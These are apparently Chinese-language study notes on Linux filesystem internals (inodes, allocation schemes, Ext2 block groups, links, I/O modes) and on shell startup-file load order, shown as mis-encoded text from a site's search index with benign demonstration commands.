æ–‡ä»¶ç³»ç»Ÿå°±æ˜¯æ“ä½œç³»ç»Ÿä¸­è´Ÿè´£ç®¡ç†æŒä¹…æ•°æ®çš„å­ç³»ç»Ÿï¼ˆæŒä¹…åŒ–çš„å°†æ–‡ä»¶ä¿å­˜åœ¨ç¡¬ç›˜ä¸Šï¼‰ æ–‡ä»¶ç³»ç»Ÿçš„åŸºæœ¬æ•°æ®å•ä½æ˜¯æ–‡ä»¶ï¼Œç›®çš„æ˜¯å¯¹ç£ç›˜ä¸Šçš„æ–‡ä»¶è¿›è¡Œç®¡ç† Linuxï¼Œä¸€åˆ‡çš†æ–‡ä»¶ Linuxæ•°æ®ç³»ç»Ÿä¼šä¸ºæ¯ä¸ªæ–‡ä»¶åˆ†é…ä¸¤ä¸ªæ•°æ®ç»“æ„ï¼š ç´¢å¼•èŠ‚ç‚¹ (index node)å’Œ ç›®å½•é¡¹ (directory entry)ï¼Œè®°å½•æ–‡ä»¶å…ƒä¿¡æ¯å’Œç›®å½•å±‚æ¬¡ç»“æ„ ç´¢å¼•èŠ‚ç‚¹ è®°å½•æ–‡ä»¶çš„å…ƒä¿¡æ¯ï¼Œå¦‚è®¿é—®æƒé™ã€å¤§å°ã€æ•°æ®åœ¨ç£ç›˜çš„ä½ç½®ç­‰ç­‰ï¼Œå‚¨å­˜åœ¨ç¡¬ç›˜ä¸­ ç›®å½•é¡¹ è®°å½•æ–‡ä»¶çš„åå­—ã€ç´¢å¼•èŠ‚ç‚¹æŒ‡é’ˆä»¥åŠä¸å…¶ä»–ç›®å½•é¡¹çš„å±‚çº§å…³è”å…³ç³»ã€‚ å¤šä¸ªç›®å½•é¡¹å…³è”èµ·æ¥ï¼Œå½¢æˆç›®å½•ç»“æ„ï¼Œä¸ç´¢å¼•èŠ‚ç‚¹ä¸åŒçš„æ˜¯ï¼Œç›®å½•é¡¹æ˜¯ç”±å†…æ ¸ç»´æŠ¤çš„ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œä¸å­˜æ”¾äºç£ç›˜è€Œæ˜¯å­˜åœ¨äºå†…å­˜ è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ æ–‡ä»¶ç³»ç»Ÿçš„ç§ç±»ç¹å¤šï¼Œè€Œæ“ä½œç³»ç»Ÿå¸Œæœ›å¯¹ç”¨æˆ·æä¾›ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£ï¼Œäºæ˜¯åœ¨ç”¨æˆ·å±‚å’Œæ–‡ä»¶ç³»ç»Ÿå±‚ä¸­å¼•å…¥äº†ä¸­é—´å±‚ï¼Œè¢«ç§°ä¸ºè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ æ–‡ä»¶å­˜å‚¨æ–¹å¼ è¿ç»­ç©ºé—´å­˜æ”¾ï¼š è¿ç»­çš„ç‰©ç†ç©ºé—´å­˜å‚¨ï¼Œæ˜“äº§ç”Ÿç£ç›˜ç¢ç‰‡ éè¿ç»­ç©ºé—´å­˜æ”¾ é“¾è¡¨æ–¹å¼ éšå¼é“¾è¡¨ å®ç°çš„æ–¹å¼æ˜¯æ–‡ä»¶å¤´è¦åŒ…å«ç£ç›˜å—\"ç¬¬ä¸€å—\"å’Œ\"æœ€åä¸€å—\"çš„ä½ç½®ï¼Œ å¹¶ä¸”æ¯ä¸ªæ•°æ®å—ç•™å‡ºä¸€ä¸ªæŒ‡é’ˆç©ºé—´ï¼Œç”¨æ¥å­˜æ”¾ä¸‹ä¸€ä¸ªæ•°æ®å—çš„ä½ç½®ã€‚ ç¨³å®šæ€§è¾ƒå·®ï¼Œä¸€èˆ¬å‘ç”Ÿé”™è¯¯å¯¼è‡´æŒ‡é’ˆæŸåï¼Œä¼šå¯¼è‡´æ–‡ä»¶æ•°æ®çš„ä¸¢å¤± æ˜¾å¼é“¾æ¥ ç›¸å½“äºåœ¨éšå¼çš„åŸºç¡€ä¸Šå–å‡ºæ‰€æœ‰çš„æŒ‡é’ˆï¼Œæ”¾åœ¨å†…å­˜çš„ä¸€ä¸ªè¡¨ä¸Šã€‚ é“¾æ¥æ–‡ä»¶å„ä¸ªæ•°æ®å—çš„æŒ‡é’ˆï¼Œæ˜¾å¼çš„å­˜æ”¾åœ¨å†…å­˜çš„ä¸€å¼ è¡¨ä¸­ï¼Œæ¯ä¸ªè¡¨é¡¹ä¸­å­˜æ”¾é“¾æ¥æŒ‡é’ˆï¼Œ æŒ‡å‘ä¸‹ä¸€ä¸ªæ•°æ®å—å·ã€‚ï¼ˆè¡¨åœ¨å†…å­˜ï¼Œä¸é€‚ç”¨ä¸å¤§ç£ç›˜ï¼‰ é“¾è¡¨çš„æ–¹å¼è§£å†³äº†è¿ç»­åˆ†é…çš„ç£ç›˜ç¢ç‰‡å’Œæ–‡ä»¶åŠ¨æ€æ‹“å±•é—®é¢˜ï¼Œä½†æ˜¯ä¸èƒ½æœ‰æ•ˆæ”¯æŒç›´æ¥è®¿é—®ï¼ˆFATé™¤å¤–ï¼‰ ç´¢å¼•æ–¹å¼ ç´¢å¼•è§£å†³äº†ç›´æ¥è®¿é—®çš„é—®é¢˜ã€‚ç´¢å¼•çš„ç°å®æ˜¯ä¸ºæ¯ä¸ªæ–‡ä»¶åˆ›å»ºä¸€ä¸ªç´¢å¼•æ•°æ®å—ï¼Œé‡Œé¢å­˜æ”¾çš„æ˜¯æŒ‡å‘æ–‡ä»¶æ•°æ®å—çš„æŒ‡é’ˆåˆ—è¡¨ã€‚ ç´¢å¼•çš„ç¼ºé™·åœ¨äºå‚¨å­˜ç´¢å¼•å¸¦æ¥çš„é¢å¤–å¼€é”€ é“¾å¼ç´¢å¼•å— é“¾è¡¨åŠ ç´¢å¼•çš„ç»„åˆï¼Œå®ç°æ–¹å¼æ˜¯åœ¨ç´¢å¼•æ•°æ®å—ç•™å‡ºä¸€ä¸ªå­˜æ”¾ä¸‹ä¸€ä¸ªç´¢å¼•æ•°æ®å—çš„æŒ‡é’ˆã€‚ä¼šå‡ºç°æŸä¸ªç´¢å¼•æ•°æ®å—åäº†å¯¼è‡´æ–‡ä»¶å—æŸã€‚ å¤šçº§ç´¢å¼•å— é€šè¿‡ä¸€ä¸ªç´¢å¼•å—æ¥å­˜å‚¨å¤šä¸ªç´¢å¼•æ•°æ®å—ï¼ˆä¿„ç½—æ–¯å¥—å¨ƒï¼‰ã€‚ æ—©æœŸ Unixå­˜å‚¨ ç»“åˆäº†ä»¥ä¸Šçš„ä¼˜ç‚¹: ä¸€ä¸ªç´¢å¼•æ–‡ä»¶å¤´ï¼ˆInodeï¼‰â€”â€”â€”â€”â€”â€”>10ä¸ªæ•°æ®å— â€”â€”â€”â€”â€”â€”>ä¸€çº§ç´¢å¼•æ•°æ®å—â€”â€”â€”â€”â€”â€”>nä¸ªæ•°æ®å— â€”â€”â€”â€”â€”â€”>äºŒçº§ç´¢å¼•æ•°æ®å—â€”â€”â€”â€”â€”â€”>n&#94;2ä¸ªæ•°æ®å— â€”â€”â€”â€”â€”â€”>ä¸‰çº§ç´¢å¼•æ•°æ®å—â€”â€”â€”â€”â€”â€”>n&#94;3ä¸ªæ•°æ®å— å¦‚æœå­˜æ”¾æ–‡ä»¶çš„æ•°æ®å—è¶…è¿‡10å—ï¼Œé‡‡ç”¨ç›´æ¥æŸ¥æ‰¾çš„æ–¹å¼ è¶…è¿‡10å—ï¼Œé‡‡ç”¨ä¸€çº§é—´æ¥ç´¢å¼•ï¼› ä»¥ä¸Šä¸å¤Ÿå­˜æ”¾å¤§æ–‡ä»¶ï¼Œé‡‡ç”¨äºŒçº§ç´¢å¼•ï¼› ä»¥ä¸Šä¸å¤Ÿå­˜æ”¾å¤§æ–‡ä»¶ï¼Œé‡‡ç”¨ä¸‰çº§ç´¢å¼•ã€‚ æ–‡ä»¶å¤´åŒ…å«13ä¸ªæŒ‡é’ˆï¼Œ10ä¸ªæŒ‡å‘æ•°æ®å—ï¼Œå„1ä¸ªä¸€ã€äºŒã€ä¸‰çº§ç´¢å¼•çš„æŒ‡é’ˆæŒ‡å‘ã€‚ æ­¤æ–¹æ¡ˆç”¨åœ¨äº†Linux Ext2/3æ–‡ä»¶ç³»ç»Ÿé‡Œï¼Œè§£å†³äº†å¤§æ–‡ä»¶çš„å­˜å‚¨ï¼Œä½†æ˜¯å¯¹äºå¤§æ–‡ä»¶çš„è®¿é—®éœ€è¦å¤§é‡çš„æŸ¥è¯¢ï¼Œè®¿é—®æ•ˆç‡ä½ã€‚ ç©ºé—²ç©ºé—´ç®¡ç† ç©ºé—²è¡¨æ³• ä¸ºæ‰€æœ‰çš„ç©ºé—²ç©ºé—´å»ºç«‹ä¸€å¼ è¡¨ï¼ŒåŒ…å«ç©ºé—²åŒºçš„ç¬¬ä¸€ä¸ªå—å·å’Œè¯¥ç©ºé—²åŒºçš„ä¸ªæ•°ï¼ˆè¿ç»­åˆ†é…ï¼‰ ç©ºé—²é“¾è¡¨æ³• æ‰€æœ‰çš„ç©ºé—²å—ä»¥é“¾è¡¨çš„æ–¹å¼æ¥æŒ‡å‘ï¼Œç‰¹ç‚¹æ˜¯ç®€å• ç¼ºç‚¹ï¼šæŒ‡é’ˆä¼šæ¶ˆè€—ä¸€å®šå­˜å‚¨ç©ºé—´ï¼Œä¸èƒ½éšæœºè®¿é—®ï¼Œæ•ˆç‡ä½ ç©ºé—²è¡¨å’Œç©ºé—²é“¾è¡¨éƒ½ä¸é€‚åˆå¤§æ–‡ä»¶ç³»ç»Ÿï¼Œå¦åˆ™ä¼šä½¿è¡¨å¤ªå¤§ ä½å›¾æ³• åˆ©ç”¨äºŒè¿›åˆ¶çš„ä¸€ä½æ¥è¡¨ç¤ºç£ç›˜ä¸­ä¸€ä¸ªç›˜å—çš„ä½¿ç”¨æƒ…å†µ ï¼ˆLinuxå°±é‡‡ç”¨æ­¤æ³•ç®¡ç†ç©ºé—²ç©ºé—´ï¼Œè¿˜ç”¨æ¥è¿›è¡ŒInodeç©ºé—²å—çš„ç®¡ç†ï¼Œå› ä¸ºInodeä¹Ÿæ˜¯å­˜åœ¨ç£ç›˜çš„ï¼‰ æ–‡ä»¶ç³»ç»Ÿçš„ç»“æ„ æ•°æ®åº“çš„ä½å›¾æ˜¯æ”¾åœ¨ç£ç›˜å—é‡Œçš„ï¼Œå‡è®¾æ˜¯æ”¾åœ¨ä¸€ä¸ªå—é‡Œï¼Œä¸€ä¸ªå—4 kï¼Œ æ¯ä½è¡¨ç¤ºä¸€ä¸ªæ•°æ®å—ï¼Œå…±å¯ä»¥è¡¨ç¤º4 * 1024 * 8 = 2&#94;15ä¸ªç©ºé—²å—ï¼Œ ç”±äºä¸€ä¸ªæ•°æ®å—æ˜¯4 kå¤§å°ï¼Œé‚£ä¹ˆæœ€å¤§å¯ä»¥è¡¨ç¤º 2&#94;15 * 4 * 1024 = 2&#94;27 ä¸ªbyteï¼Œä¹Ÿå°±æ˜¯128 Mã€‚ ä¹Ÿå°±æ˜¯è¯´æŒ‰ç…§ä¸Šé¢çš„ç»“æ„ï¼Œé‡‡ç”¨ [ä¸€ä¸ªå—çš„ä½å›¾ + ä¸€ç³»åˆ—çš„å—] ï¼Œ å¤–åŠ  [ä¸€ä¸ªiNodeçš„ä½å›¾ + ä¸€ç³»åˆ—iNodeçš„ç»“æ„] æ‰€è¡¨ç¤ºçš„å†…å®¹æœ€å¤§128 Må¤ªå°‘äº†ã€‚ ä¸Šè¿°ç»“æ„åœ¨Linuxä¸­è¢«ç§°ä¸ºä¸€ä¸ª**å—ç»„**ï¼Œ é‚£ä¹ˆæœ‰nå¤šçš„å—ç»„ï¼Œå°±èƒ½è¡¨ç¤ºnå¤§çš„æ–‡ä»¶ Linux Ext2 æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿç”±1 kçš„å¼•å¯¼å—åŠ nä¸ªå—ç»„ç»„æˆï¼Œå—ç»„åŒ…å« è¶…çº§å—1å— å—ç»„æè¿°ç¬¦å¤šå— æ•°æ®ä½å›¾ä¸€å— iNodeä½å›¾ä¸€å— iNodeåˆ—è¡¨å¤šå— æ•°æ®å—å¤šå— å…¶ä¸­ï¼Œ è¶…çº§å— ä¸ å—ç»„æè¿°ç¬¦ æ˜¯å…¨å±€ä¿¡æ¯ï¼Œéå¸¸é‡è¦ Ext2çš„åç»­ç³»ç»Ÿä¸­é‡‡ç”¨äº†ç¨€ç–æŠ€æœ¯ï¼ˆå¹¶ä¸æ˜¯æ¯ä¸€å—éƒ½æœ‰ è¶…çº§å— ä¸ å—ç»„æè¿°ç¬¦ ï¼‰ã€‚ ç›®å½•çš„å­˜å‚¨ ç›®å½•æ–‡ä»¶çš„å—é‡Œä¿å­˜ç€ç›®å½•é‡Œé¢ä¸€é¡¹é¡¹æ–‡ä»¶ä¿¡æ¯ã€‚ Linuxçš„Extæ–‡ä»¶ç³»ç»Ÿå°±æ˜¯é‡‡ç”¨äº†å“ˆå¸Œè¡¨ï¼Œæ¥ä¿å­˜ç›®å½•çš„å†…å®¹ã€‚ ç›®å½•æŸ¥è¯¢é€šè¿‡åœ¨ç£ç›˜åå¤æœç´¢æ‰€å®Œæˆï¼Œi/oå¼€é”€æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥å¯ä»¥å…ˆç¼“å­˜åœ¨å†…å­˜é‡Œé¢ã€‚ è½¯é“¾æ¥å’Œç¡¬é“¾æ¥ ç¡¬é“¾æ¥ å¤šä¸ªç›®å½•é¡¹çš„ç´¢å¼•èŠ‚ç‚¹æŒ‡å‘ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œè€Œ iNode æ˜¯ä¸å¯è·¨æ–‡ä»¶ç³»ç»Ÿçš„ï¼Œ æ¯ä¸ªæ–‡ä»¶ç³»ç»Ÿéƒ½æœ‰è‡ªå·±çš„iNodeæ•°æ®ç»“æ„å’Œåˆ—è¡¨ï¼Œæ‰€ä»¥ç¡¬é“¾æ¥æ˜¯ä¸å¯è·¨æ–‡ä»¶ç³»ç»Ÿçš„ã€‚ åªæœ‰åˆ é™¤æ–‡ä»¶çš„æ‰€æœ‰ç¡¬é“¾æ¥ä»¥åŠæºæ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿæ‰ä¼šå½»åº•åˆ é™¤è¯¥æ–‡ä»¶ã€‚ è½¯é“¾æ¥ ç›¸å½“äºé‡æ–°åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æœ‰ç‹¬ç«‹çš„inodeï¼Œä½†æ˜¯æ–‡ä»¶å†…å®¹æ˜¯å¦å¤–ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„ï¼Œ æ‰€ä»¥è®¿é—®è½¯é“¾æ¥çš„æ—¶å€™ï¼Œå®é™…ç›¸å½“äºè®¿é—®åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥è½¯é“¾æ¥æ˜¯å¯è·¨è¶Šæ–‡ä»¶ç³»ç»Ÿçš„ã€‚ æ€»ç»“ä¸€ä¸‹ï¼š ç¡¬é“¾æ¥ï¼š ä¸æ™®é€šæ–‡ä»¶æ²¡ä»€ä¹ˆä¸åŒï¼Œ inode éƒ½æŒ‡å‘åŒä¸€ä¸ªæ–‡ä»¶åœ¨ç¡¬ç›˜ä¸­çš„åŒºå— è½¯é“¾æ¥ï¼š ä¿å­˜äº†å…¶ä»£è¡¨çš„æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œæ˜¯å¦å¤–ä¸€ç§æ–‡ä»¶ï¼Œåœ¨ç¡¬ç›˜ä¸Šæœ‰ç‹¬ç«‹çš„åŒºå—ï¼Œè®¿é—®æ—¶æ›¿æ¢è‡ªèº«è·¯å¾„ã€‚ æ–‡ä»¶i/o åˆ†ç±»ï¼š ç¼“å†²ä¸éç¼“å†²i/o æ˜¯å¦é€šè¿‡æ ‡å‡†åº“çš„ç¼“å­˜è®¿é—®æ–‡ä»¶ï¼ˆç¼“å†²ï¼šæ ‡å‡†åº“å†…éƒ¨çš„ç¼“å†²ï¼‰ã€‚ ç›´æ¥ä¸éç›´æ¥i/o æ˜¯å¦åˆ©ç”¨æ“ä½œç³»ç»Ÿçš„ç¼“å­˜ï¼Œå†…æ ¸ç©ºé—´ç¼“å­˜ï¼Œä¹Ÿå«é¡µç¼“å­˜ ç›´æ¥i/oï¼šä¸ä¼šå‘ç”Ÿå†…æ ¸ç¼“å­˜å’Œç”¨æˆ·æ•°æ®ä¹‹é—´çš„å¤åˆ¶ï¼Œè€Œæ˜¯ç›´æ¥ç»è¿‡æ–‡ä»¶ç³»ç»Ÿè®¿é—®ç£ç›˜ã€‚ éç›´æ¥i/oï¼šè¯»æ“ä½œæ—¶ï¼Œæ•°æ®ä»å†…æ ¸ç¼“å­˜æ‹·è´ç»™ç”¨æˆ·ç¨‹åºï¼Œå†™æ“ä½œæ—¶ï¼Œæ•°æ®ä»ç”¨æˆ·ç¨‹åºæ‹·è´ç»™å†…æ ¸ç¼“å­˜ï¼Œå†ç”±å†…æ ¸å†³å®šä»€ä¹ˆæ—¶å€™å†™åˆ°ç£ç›˜ é˜»å¡ä¸éé˜»å¡i/o VS åŒæ­¥ä¸å¼‚æ­¥i/o é˜»å¡ç­‰å¾…çš„æ˜¯\"å†…æ ¸æ•°æ®å‡†å¤‡å¥½\"å’Œ\"æ•°æ®ä»å†…æ ¸æ€æ‹·è´åˆ°ç”¨æˆ·æ€\"è¿™ä¸¤ä¸ªè¿‡ç¨‹ã€‚ éé˜»å¡ï¼Œreadåœ¨ä¸ºå‡†å¤‡å¥½æ—¶ç«‹å³è¿”å›ï¼Œååˆè½®è¯¢ã€‚ä»¥ä¸ºå¤ªå‚»äº†ï¼Œæ”¹è¿›äº†æœ‰äº†å¤šè·¯å¤ç”¨ï¼ˆéƒ½æ˜¯åŒæ­¥çš„ï¼‰ã€‚ å¼‚æ­¥ä¸éœ€ç­‰å¾…ï¼Œå¯ä»¥ç›´æ¥å»åšå…¶ä»–çš„ï¼Œç³»ç»Ÿä¼šè‡ªå·±å®Œæˆè°ƒç”¨å†™åˆ°ç¨‹åºç©ºé—´","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-File-system-detailed-explanation.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-File-system-detailed-explanation.html"},{"title":"linuxç³»ç»Ÿç¯å¢ƒåŠ è½½é¡ºåº","text":"ç™»é™†shell(login shell) å–å¾— bash æ—¶éœ€è¦å®Œæ•´çš„ç™»é™†æµç¨‹çš„ï¼Œå°±ç§°ä¸º login shell. æ¯”å¦‚é€šè¿‡sshæ–¹å¼è¿æ¥ï¼Œæˆ–è€…ç”±tty1 ~ tty6 ç™»é™†ï¼Œ éœ€è¦è¾“å…¥ç”¨æˆ·çš„è´¦å·ä¸å¯†ç ï¼Œæ­¤æ—¶å–å¾—çš„ bash å°±ç§°ä¸ºlogin shell å½“æˆ‘ä»¬åœ¨ç»ˆç«¯ä¸Šè¿è¡Œ bash ã€ zsh ç­‰å‘½ä»¤ç™»å½•ç³»ç»Ÿæ—¶,å¯åŠ¨çš„shellå°±æ˜¯ç™»å½•shellã€‚ å®ƒçš„ç¯å¢ƒå˜é‡åŠ è½½é¡ºåºæ˜¯: /etc/profile æ­¤æ–‡ä»¶ä¸ºç³»ç»Ÿçš„æ¯ä¸ªç”¨æˆ·è®¾ç½®ç¯å¢ƒä¿¡æ¯ï¼Œå½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•æ—¶ï¼Œè¯¥æ–‡ä»¶è¢«æ‰§è¡Œã€‚ å¹¶ä»/etc/profile.dç›®å½•çš„é…ç½®æ–‡ä»¶ä¸­æœé›†shellçš„è®¾ç½®ã€‚ /etc/bashrc ä¸ºæ¯ä¸€ä¸ªè¿è¡Œbash shellçš„ç”¨æˆ·æ‰§è¡Œæ­¤æ–‡ä»¶ã€‚å½“bash shellè¢«æ‰“å¼€æ—¶ï¼Œè¯¥æ–‡ä»¶è¢«è¯»å–ã€‚ ~/.bash_profile æ¯ä¸ªç”¨æˆ·éƒ½å¯ä½¿ç”¨è¯¥æ–‡ä»¶è¾“å…¥ä¸“ç”¨äºè‡ªå·±ä½¿ç”¨çš„shellä¿¡æ¯ï¼Œå½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œè¯¥æ–‡ä»¶ä»…ä»…æ‰§è¡Œä¸€æ¬¡ï¼é»˜è®¤æƒ…å†µä¸‹ï¼Œä»–è®¾ç½®ä¸€äº›ç¯å¢ƒå˜é‡ï¼Œæ‰§è¡Œç”¨æˆ·çš„ã€‚bashrcæ–‡ä»¶ã€‚ ~/.bash_login ~/.profile ~/.bashrc è¯¥æ–‡ä»¶åŒ…å«ä¸“ç”¨äºä½ çš„bash shellçš„bashä¿¡æ¯ï¼Œå½“ç™»å½•æ—¶ä»¥åŠæ¯æ¬¡æ‰“å¼€æ–°çš„shellæ—¶ï¼Œè¯¥è¯¥æ–‡ä»¶è¢«è¯»å–ã€‚ ~/.bash_logout å½“æ¯æ¬¡é€€å‡ºç³»ç»Ÿï¼ˆé€€å‡ºbash shellï¼‰æ—¶ï¼Œæ‰§è¡Œè¯¥æ–‡ä»¶ã€‚ å¦å¤–ï¼Œ/etc/profileä¸­è®¾å®šçš„å˜é‡ï¼ˆå…¨å±€ï¼‰çš„å¯ä»¥ä½œç”¨äºä»»ä½•ç”¨æˆ·ï¼Œè€Œ~/.bashrcç­‰ä¸­è®¾å®šçš„å˜é‡ï¼ˆå±€éƒ¨ï¼‰åª èƒ½ç»§æ‰¿/etc/profileä¸­çš„å˜é‡ï¼Œä»–ä»¬æ˜¯\"çˆ¶å­\"å…³ç³»ã€‚ ~/.bash_profile æ˜¯äº¤äº’å¼ã€login æ–¹å¼è¿›å…¥ bash è¿è¡Œçš„ ~/.bashrc æ˜¯äº¤äº’å¼ non-login æ–¹å¼è¿›å…¥ bash è¿è¡Œçš„é€šå¸¸äºŒè€…è®¾ç½®å¤§è‡´ç›¸åŒï¼Œæ‰€ä»¥é€šå¸¸å‰è€…ä¼šè°ƒç”¨åè€…ã€‚ éç™»é™†shell(non-login shell) å–å¾— bash æ¥å£çš„æ–¹æ³•ä¸éœ€è¦é‡å¤ç™»é™†çš„ä¸¾åŠ¨. æ¯”å¦‚ä½ ä»¥ X window ç™»é™† Linux åï¼Œ å†ä»¥ X çš„å›¾å½¢åŒ–æ¥å£å¯åŠ¨ç»ˆç«¯æœºï¼Œ æ­¤æ—¶è¯¥ç»ˆç«¯æ¥å£æ— éœ€è¾“å…¥è´¦å·ä¸å¯†ç ï¼Œåˆ™ä¸ºnon-login shell; åˆæ¯”å¦‚ä½ åœ¨åŸæœ¬çš„ bash ç¯å¢ƒä¸‹å†æ¬¡ä¸‹è¾¾ bash è¿™ä¸ªå‘½ä»¤ï¼Œ åŒæ ·çš„ä¹Ÿæ²¡æœ‰è¾“å…¥è´¦å·å¯†ç ï¼Œ é‚£ç¬¬äºŒä¸ª bash (å­ç¨‹åº) ä¹Ÿæ˜¯ non-login shell. å½“æˆ‘ä»¬åœ¨ç»ˆç«¯ä¸Šè¿è¡Œ bash -c 'command' æˆ–åœ¨GUIç¨‹åºä¸­å¯åŠ¨shellæ—¶,å¯åŠ¨çš„shellå°±æ˜¯éç™»å½•shellã€‚ å®ƒçš„ç¯å¢ƒå˜é‡åŠ è½½é¡ºåºæ˜¯: /etc/bash.bashrc ~/.bashrc æ³¨è§£ å¯ä»¥é€šè¿‡ echo $0 æŸ¥çœ‹å±äºé‚£ç§Shell æ¼”ç¤º æ¼”ç¤ºç¯å¢ƒ: [root@system1 ~]# more /etc/redhat-release Red Hat Enterprise Linux Server release 7.0 (Maipo) å½“å‰ä»sshç™»é™†åˆ°æœåŠ¡å™¨: [root@system1 ~]# tty /dev/pts/1 è¾“å…¥ echo $0ï¼Œ æ˜¾ç¤ºç»“æœä¸º -bash ï¼Œå³ä¸ºç™»é™†shell: [root@system1 ~]# echo $0 -bash [root@system1 ~]# ps PID TTY TIME CMD 77122 pts/1 00:00:00 bash 77157 pts/1 00:00:00 ps ä¸‹é¢åœ¨X windowsæ‰“å¼€ä¸€ä¸ªç»ˆç«¯ï¼Œå¦‚ä¸‹ï¼Œæ˜¾ç¤ºä¸º/bin/bashï¼Œå³éç™»é™†shell: [root@system1 Desktop]# echo $0 /bin/bash [root@system1 ~]# ps -ef|grep pts|grep bash root 73245 73241 0 11:49 pts/0 00:00:00 /bin/bash root 76511 73245 0 16:19 pts/0 00:00:00 bash root 77122 77118 0 17:02 pts/1 00:00:00 -bash root 77158 77118 0 17:03 pts/2 00:00:00 -bash root 77210 73241 0 17:04 pts/3 00:00:00 /bin/bash root 77283 77279 0 17:06 pts/4 00:00:00 -bash root 77332 77122 0 17:06 pts/1 00:00:00 grep --color=auto bash åœ¨ä¸Šä¼ çš„ç»“æœä¸­73245ï¼Œ77210ä¸ºéç™»é™†shellï¼Œ77122ï¼Œ77158ï¼Œ77283ä¸ºç™»é™†shell äº¤äº’å¼shell(interactive shell) äº¤äº’å¼æ¨¡å¼å°±æ˜¯åœ¨ç»ˆç«¯ä¸Šæ‰§è¡Œï¼Œshellç­‰å¾…ä½ çš„è¾“å…¥ï¼Œå¹¶ä¸”ç«‹å³æ‰§è¡Œä½ æäº¤çš„å‘½ä»¤ã€‚ è¿™ç§æ¨¡å¼è¢«ç§°ä½œäº¤äº’å¼æ˜¯å› ä¸ºshellä¸ç”¨æˆ·è¿›è¡Œäº¤äº’ã€‚ è¿™ç§æ¨¡å¼ä¹Ÿæ˜¯å¤§å¤šæ•°ç”¨æˆ·éå¸¸ç†Ÿæ‚‰çš„ï¼šç™»å½•ã€æ‰§è¡Œä¸€äº›å‘½ä»¤ã€é€€å‡ºã€‚å½“ä½ é€€å‡ºåï¼Œshellä¹Ÿç»ˆæ­¢äº†ã€‚ æ— è®ºæ˜¯ç™»å½•shellè¿˜æ˜¯éç™»å½•shell,åªè¦å®ƒ attach åˆ°å½“å‰ç»ˆç«¯å¹¶æ¥å—ç”¨æˆ·çš„è¾“å…¥, é‚£å®ƒå°±æ˜¯ä¸€ä¸ªäº¤äº’å¼shellã€‚ äº¤äº’å¼shellçš„ç¯å¢ƒå˜é‡åŠ è½½é¡ºåºåŒ…æ‹¬: ç™»å½•shellæˆ–éç™»å½•shellåŠ è½½çš„æ‰€æœ‰æ–‡ä»¶ ~/.inputrc éäº¤äº’å¼shell(non-interactive shell) shellä¹Ÿå¯ä»¥è¿è¡Œåœ¨å¦å¤–ä¸€ç§æ¨¡å¼ï¼šéäº¤äº’å¼æ¨¡å¼ï¼Œä»¥shell script(éäº¤äº’)æ–¹å¼æ‰§è¡Œã€‚ åœ¨è¿™ç§æ¨¡å¼ ä¸‹ï¼Œshellä¸ä¸ä½ è¿›è¡Œäº¤äº’ï¼Œè€Œæ˜¯è¯»å–å­˜æ”¾åœ¨æ–‡ä»¶ä¸­çš„å‘½ä»¤,å¹¶ä¸”æ‰§è¡Œå®ƒä»¬ã€‚ å½“å®ƒè¯»åˆ°æ–‡ä»¶çš„ç»“å°¾EOFï¼Œshellä¹Ÿå°±ç»ˆæ­¢äº†ã€‚ å¦‚æœä¸€ä¸ªshellåœ¨åå°æ‰§è¡Œ,ä¸æ¥å—ä»»ä½•ç”¨æˆ·è¾“å…¥,é‚£ä¹ˆå®ƒå°±æ˜¯éäº¤äº’å¼shellã€‚éäº¤äº’å¼shellä»…åŠ è½½: ç™»å½•shellåŠ è½½çš„æ–‡ä»¶(/etc/profileå’Œ~/.bash_profile) éç™»å½•shellåŠ è½½çš„æ–‡ä»¶(/etc/bash.bashrc) å¦‚ä¸‹ï¼Œæ‰§è¡Œ echo $-ï¼ŒæŸ¥çœ‹å…¶ä¸­çš„\"i\"é€‰é¡¹ï¼ˆè¡¨ç¤ºinteractive shellï¼‰: [root@system1 ~]# echo $- himBH å¦‚ä¸‹ï¼Œä¸ºéäº¤äº’shell: [root@system1 ~]# echo 'echo $-' | bash hB ç¯å¢ƒå˜é‡çš„è°ƒç”¨é¡ºåº å¯¹äºç™»é™†shellï¼Œè¯»å–~/.bash_profileé…ç½®æ–‡ä»¶æ—¶ï¼Œä¼šåšå‡ºè¯»å–é¡ºåºåˆ¤è¯»ï¼Œå¦‚ä¸‹: ~/.bash_profile â€”> ~/.bash_login â€”> ~/.profile ä½† bash çš„ login shell é…ç½®åªä¼šè¯»å–ä¸Šé¢ä¸‰ä¸ªæ–‡ä»¶çš„å…¶ä¸­ä¸€ä¸ªï¼Œ è€Œè¯»å–çš„é¡ºåºåˆ™æ˜¯ä¾ç…§ä¸Šé¢çš„é¡ºåºã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœ ~/.bash_profile å­˜åœ¨ï¼Œé‚£ä¹ˆå…¶ä»–ä¸¤ä¸ªæ–‡ä»¶ä¸è®ºæœ‰æ— å­˜åœ¨ï¼Œéƒ½ä¸ä¼šè¢«è¯»å–ã€‚ å¦‚æœ ~/.bash_profile ä¸å­˜åœ¨æ‰ä¼šå»è¯»å– ~/.bash_loginï¼Œè€Œå‰ä¸¤è€…éƒ½ä¸å­˜åœ¨æ‰ä¼šè¯»å– ~/.profile çš„æ„æ€ã€‚ åœ¨shellç™»å‡ºæ—¶ä¼šè¯»å– ~/.bash_logout å±äºéç™»å½•shellï¼šä¸éœ€è¦è¾“å…¥å¯†ç çš„ç™»å½•åŠè¿œç¨‹ SSH è¿æ¥â€”â€”> ~/.bashrcï¼ˆç”¨æˆ·æ–‡ä»¶U2ï¼‰â€”â€”>/etc/bashrcï¼ˆå…¨å±€æ–‡ä»¶G2ï¼‰ 